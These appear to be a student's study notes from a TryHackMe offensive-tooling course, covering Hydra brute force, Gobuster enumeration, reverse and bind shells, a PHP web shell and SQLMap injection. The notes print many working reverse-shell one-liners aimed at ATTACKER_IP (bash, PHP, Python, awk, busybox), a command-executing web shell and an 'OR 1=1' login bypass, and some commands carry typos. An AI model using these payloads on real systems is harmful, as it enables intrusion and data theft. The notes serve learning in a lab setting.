# Offensive-security-tooling-note-cybersec101-
Here are ny notes after finishing tryhackme offensive security tooling
Hydra:
Hydra is a brute force online password cracking program
Hydra can run through a list and “brute force” some authentication services
Hydra supports Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, Radmin, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, TeamSpeak (TS2), Telnet, VMware-Auth, VNC and XMPP 
Hydra commands: hydra -l user -P passlist.txt ftp://10. 130.167.5 (this command brute force FTP with the username being user and a password list being passlist.txt)
Hydra commands: hydra -l root -P passwords.txt 10.130.167.5 -t 4 ssh (hyra will use root as the username for ssh, it will try the passwords in the passwords.txt file and there will be four threads running in parallel as indicated by -t 4
Hydra commands: sudo hydra <username> <wordlist> 10.130.167.5 http-post-form "<path>:<login_credentials>:<invalid_response>" (for brute forcing web forms)
Hydra commands: hydra -l <username> -P <wordlist> 10.130.167.5 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V (a more concrete example Hydra command to brute force a POST login form)
Hydra co,,amds: hydra -l <username> -P <wordlist> 10.130.167.5 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -s <port> -V (to specify the port number)
Gobuster
Gobuster is an open-source offensive tool written in Golang. It enumerates web directories, DNS subdomains, vhosts, Amazon 53 buckets, and google Cloud Storage by brute force, using specific wordlists and handling the incoming responses.
Enumeration: is the act of listing all the available resources, whether they are accessible or not. For example, Go buster enumerates web directories
Brute Force: is the act of trying every possibility until a match is found.
To get the help page for Gobuster do: gobuster –help
To enumerate a web directory: 
Gobuster dir -u “http://www.example.thm/” -w /usr/share/wordlists/dirb/small.txt -t 64
Gobuster dir: indicates that we will use the directory and file enumeration mode
-u “http://www.example.thm/”: tells gobuster that the target URL is http://example.thm/
-w /usr/share/wordlists/dirb/small.txt: directs gobuster to use the small.txt wordlist to bruteforce the web directories. Gobuster will use each entry in the wordlist to form a new URL and send a GET request to that URL. If the first entry of the wordlist were images, Gobuster would send a GET request to http://example.thm/images/
-t 64: sets the number of threads gobuster will use to 64. This improves the performance drastically
To get information about flags to use in dir mode do: gobuster dir –help
To run gobuster in dir mode do: gobuster dir -u “http://www.example.thm” -w /path/to/wordlist
Gobuster dir: configures gobuster to use the directory and file enumeration mode
-u http://www.example.thm: the URL will be the base path where gobuster starts looking (root web directory
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt: configures gobuster to use the directory-list-2.3-medium.txt wordlist to enumerate
-r: configures gobuster to follow the redirect responses received from the sent request
To specify what type of files we want to enumerate use to -x flag:
gobuster dir -u "http://www.example.thm" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.js
Dns mode allows gobuster to brute force subdomains
To see the help page for commands for dns mode do: gobuster dns –help
To run gubuster in dns mode do: gobuster dns -d example.thm -w path/to/wordlist
Vhost mode allows gobuster to brute force virtual hosts. Virtual hosts are different websites on the same machine:
vhost mode will navigate to the URL created by combining the configured HOSTNAME (-u flag) with an entry of a wordlist.
dns mode will do a DNS lookup to the FQDN created by combining the configured domain name (-d flag) with an entry of a wordlist.
To run gobuster in vhost mode do: gobuster vhost -u “http://example.thm” -w /path/to/wordlist
If we don't have a fully set up DNS infrastructure. This requires us to give in extra flags like --domain and --append-domain:
gobuster vhost -u "http://MACHINE_IP" --domain example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250-320
A basic GET request looks like this:
GET / HTTP/1.1
Host: www.example.thm
User-Agent: gobuster/3.6
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Gobuster will send multiple requests, each time changing the Host: part of the request. The value of Host: in this example is www.example.thm. We can break this down into three parts:
www: This is the subdomain. This is the part that Gobuster will fill in with each entry of the configured wordlist.
.example: This is the second-level domain. You can configure this with the --domain flag (this needs to be configured together with the top-level domain).
.thm: This is the top-level domain. You can configure this with the --domain flag (this needs to be configured together with the second-level domain).
--domain example.thm sets the top- and second-level domains in the Hostname: part of the request to example.thm.
--append-domain appends the configured domain to each entry in the wordlist. If this flag is not configured, the set hostname would be www, blog, etc. This will cause the command to work incorrectly and display false positives.
--exclude-length filters the responses we get from the sent web requests. With this flag, we can filter out the false positives.
Shells Overview:
A shell is software that allows a user to interact with an OS 
This allows attackers to execute several activities:
Remote System Control: allows the attacker to execute commands or software remotely in the target system.
Privilege Escalation: If initial access through a shell is limited or restricted, attackers can explore ways to escalate privileges to more elevated or administrative access.
Data Exfiltration: Once attackers have access to execute commands through an obtained shell, they can explore the system to read and copy sensitive data from it.
Persistence and Maintenance Access: Once shell access is obtained, attackers can create access through users and credentials or copy backdoor software to maintain access to the target system for later usage.
Post-Exploitation Activities: After access to a shell is granted, attackers can perform a wide range of post-exploitation activities, such as deploying malware, creating hidden accounts, and deleting information.
Access Other Systems on the Network: Depending on the attacker's intentions, the obtained shell can be just an initial access point. The goal can be to hop through the network to a different target using the obtained shell as a pivot to different points in the compromised system network. This is also known as pivoting.
A reverse shell, sometimes referred to as a "connect back shell," is one of the most popular techniques for gaining access to a system in cyberattacks. The connections initiate from the target system to the attacker's machine, which can help avoid detection from network firewalls and other security appliances. 
Common examples includes: nc -lvnp 443 (-l means listen, -v verbose mode, -n prevents the connections from using DNS for lookup and -p means port)
This connects from the target machine to the attackers machine
Once we have our listener set, the attacker should execute what is known as a reverse shell payload. This payload usually abuses the vulnerability or unauthorized access granted by the attacker and executes a command that will expose the shell through the network. For example:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f 
rm -f /tmp/f - This command removes any existing named pipe file located at /tmp/f/. This ensures that the script can create a new named pipe without conflicts.
mkfifo /tmp/f - This command creates a named pipe, or FIFO (first-in, first-out), at /tmp/f. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.
cat /tmp/f - This command reads data from the named pipe. It waits for input that can be sent through the pipe.
| bash -i 2>&1 - The output of cat is piped to a shell instance (bash -i), which allows the attacker to execute commands interactively. The 2>&1 redirects standard error to standard output, ensuring that error messages are sent back to the attacker.
| nc ATTACKER_IP ATTACKER_PORT >/tmp/f - This part pipes the shell's output through nc (Netcat) to the attacker's IP address (ATTACKER_IP) on the attacker's port (ATTACKER_PORT).
>/tmp/f -This final part sends the output of the commands back into the named pipe, allowing for bi-directional communication.
Once the above payload is executed, the attacker will receive a reverse shell, allowing them to execute commands as if they were logging into a regular terminal in the OS. 
a bind shell will bind a port on the compromised system and listen for a connection; when this connection occurs, it exposes the shell session so the attacker can execute commands remotely. For example:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f 
rm -f /tmp/f - This command removes any existing named pipe file located at /tmp/f/. This ensures that the script can create a new named pipe without conflicts.
mkfifo /tmp/f - This command creates a named pipe, or FIFO, at /tmp/f. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.
cat /tmp/f - This command reads data from the named pipe. It waits for input that can be sent through the pipe.
| bash -i 2>&1 - The output of cat is piped to a shell instance (bash -i), which allows the attacker to execute commands interactively. The 2>&1 redirects standard error to standard output, ensuring error messages are returned to the attacker.
| nc -l 0.0.0.0 8080 - Starts Netcat in listen mode (-l) on all interfaces (0.0.0.0) and port 8080. The shell will be exposed to the attacker once they connect to this port.
>/tmp/f This final part sends the commands' output back into the named pipe, allowing for bidirectional communication.
Now that the lab machine is waiting for incoming connections, we can use Netcat again with the following command to connect. 
nc -nv TARGET_IP 8080 
tools that can be used as listeners to interact with an incoming shell. 
Rlwrap: It is a small utility that uses the GNU readline library to provide editing keyboard and history. For example:
rlwrap nc -lvnp 443 (This wraps nc with rlwrap, allowing the use of features like arrow keys and history for better interaction. )
Ncat is an improved version of Netcat distributed by the NMAP project. It provides extra features, like encryption (SSL). For example:
ncat --ssl -lvnp 4444
Socat: It is a utility that allows you to create a socket connection between two data sources, in this case, two different hosts. For example:
socat -d -d TCP-LISTEN:443 STDOUT (The command above used the -d option to enable verbose output; using it again (-d -d) will increase the verbosity of the commands. The TCP-LISTEN:443 option creates a TCP listener on port 443, establishing a server socket for incoming connections. Finally, the STDOUT option directs any incoming data to the terminal. )
A Shell Payload can be a command or script that exposes the shell to an incoming connection in the case of a bind shell or a send connection in the case of a reverse shell 
Examples of these payloads that can be used in the Linux OS to expose the shell through the most popular reverse shell are:
Normal bash reverse shell: bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
This reverse shell initiates an interactive bash shell that redirects input and output through a TCP connection to the attacker's IP (ATTACKER_IP) on port 443. The >& operator combines both standard output and standard error. 
Bash read line reverse shell: exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
This reverse shell creates a new file descriptor (5 in this case)  and connects to a TCP socket. It will read and execute commands from the socket, sending the output back through the same socket. 
Bash With File Descriptor 5 Reverse Shell: bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
Similar to the first example, this command opens a shell (bash -i), but it uses file descriptor 5 for input and output, enabling an interactive session over the TCP connection. 
PHP Reverse Shell Using the exec Function: php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
This reverse shell creates a socket connection to the attacker's IP on port 443 and uses the exec function to execute a shell, redirecting standard input and output. 
PHP Reverse Shell Using the shell_exec Function: php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
Similar to the previous command, but uses the shell_exec function. 
PHP Reverse Shell Using the system Function: php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
This reverse shell employs the system function, which executes the command and outputs the result to the browser. 
PHP Reverse Shell Using the passthru Function: php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
The passthru function executes a command and sends raw output back to the browser. This is useful when working with binary data. 
PHP Reverse Shell Using the popen Function: php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
This reverse shell uses popen to open a process file pointer, allowing the shell to be executed. 
Python Reverse Shell by Exporting Environment Variables: export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
This reverse shell sets the remote host and port as environment variables, creates a socket connection, and duplicates the socket file descriptor for standard input/output. 
Python Reverse Shell Using the subprocess Module: PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
This reverse shell uses the subprocess module to spawn a shell and set up a similar environment as the Python Reverse Shell by Exporting Environment Variables command. 
Short Python Reverse Shell: PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
This reverse shell creates a socket (s), connects to the attacker, and redirects standard input, output, and error to the socket using os.dup2(). 
Telnet: TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
This reverse shell creates a named pipe using mkfifo and connects to the attacker via Telnet on IP ATTACKER_IP and port 443 
AWK: awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
This reverse shell uses AWK’s built-in TCP capabilities to connect to ATTACKER_IP:443. It reads commands from the attacker and executes them. Then it sends the results back over the same TCP connection. 
BusyBox: busybox nc ATTACKER_IP 443 -e sh
This BusyBox reverse shell uses Netcat (nc) to connect to the attacker at ATTACKER_IP:443. Once connected, it executes /bin/sh, exposing the command line to the attacker. 
A web shell is a script written in a language supported by a compromised web server that executes commands through the web server itself. A web shell is usually a file containing the code that executes commands and handles files. 
Web shells can be written in several languages supported by web servers, like PHP, ASP, JSP, and even simple CGI scripts. For example: 
<?php
if (isset($_GET['cmd'])) {
    	system($_GET['cmd']);
}
?>
The above shell can be saved into a file with the PHP extension, like shell.php, and then uploaded into the web server by the attacker by exploiting vulnerabilities such as Unrestricted File Upload, File Inclusion, Command Injection, among others, or by gaining unauthorized access to it. 
After the web shell is deployed in the server, it can be accessed through the URL where the web shell is hosted, in this example http://victim.com/uploads/shell.php. As we observed from the code in shell.php, we need to provide a GET method and the value of the variable cmd, which should contain the command the attacker wants to execute. For example, if we want to execute the command whoami the request to the URL should be:
http://victim.com/uploads/shell.php?cmd=whoami
Existing webshell includes:
p0wny-shell - A minimalistic single-file PHP web shell that allows remote command execution. 
b374k shell - A more feature-rich PHP web shell with file management and command execution, among other functionalities. 
c99 shell - A well-known and robust PHP web shell with extensive functionality. 
SQLMap:The Basics:
An sql example of asking for credential may look like:
Username: John	Password: Un@detectable444
SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
So imagine if we change the password to abc' OR 1=1;-- - 
Where the sql query will become: SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
That guarantees that our credentials are correct
SQLMap is an automated tool for detecting and exploiting SQL injection vulnerabilities in web applications. It simplifies the process of identifying these vulnerabilities 
The --help command with SQLMap will list all the available flags you can use. If you don't want to manually add the flags to each command, use the--wizard flag with SQLMap. When you use this flag, the tool will guide you through each step and ask questions to complete the scan, making this a perfect option for beginners. 
The --dbs flag helps you to extract all the database names. Once you get to know the database names, you can extract information about the tables of that database by using-D database_name --tables. After obtaining the tables, if you want to enumerate the records in those tables, you can use-D database_name -T table_name --dump 
The first step is to look for a possible vulnerable URL or request. You may often come across some URLs that use GET parameters to retrieve the data. For example, a URL like http://sqlmaptesting.thm/search?cat=1 uses a parameter cat that takes the value 1. If you see any web application using GET parameters in the URLs to retrieve data, you can test that URL with the -u flag in the SQLMap tool. 
SQLMap supports cookie-based testing via the --cookie flag, which lets you include session cookies (such as PHPSESSID, JSESSIONID, or authentication tokens) directly in your request. 
For example, after logging into an application via a browser and capturing the session cookie, you can pass it to SQLMap using --cookie="SESSIONID=abcdef123456" to accurately test injection points that are only reachable after authentication. 

The results from the command we executed for our target http://sqlmaptesting.thm/search/cat=1 tell us that different types of SQL injection are possible on this URL. Let's use SQLMap's flags, 
To fetch the databases, we use the flag --dbs. Let's try this flag out with our vulnerable URL: 
sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs
After running the above command, we got two database names. Select the  users database and fetch the tables inside of it. We will define the database after the flag-D and use the--tables flag at the end to extract all the table names. 
sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
Now that we have all the available table names of the database, let's dump the records present in the thomas table. To do so, we will define the database with the -D flag, the table with the -T flag, and for extracting the records of the table, we will use the --dump flag. 
sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T thomas --dump
However, unlike the URL used for testing above, you can also use POST-based testing, where the application sends data in the request's body instead of the URL. Examples of this could be login forms, registration forms, etc. To follow this approach, you must intercept a POST request on the login or registration page and save it as a text file 
sqlmap -r intercepted_request.txt
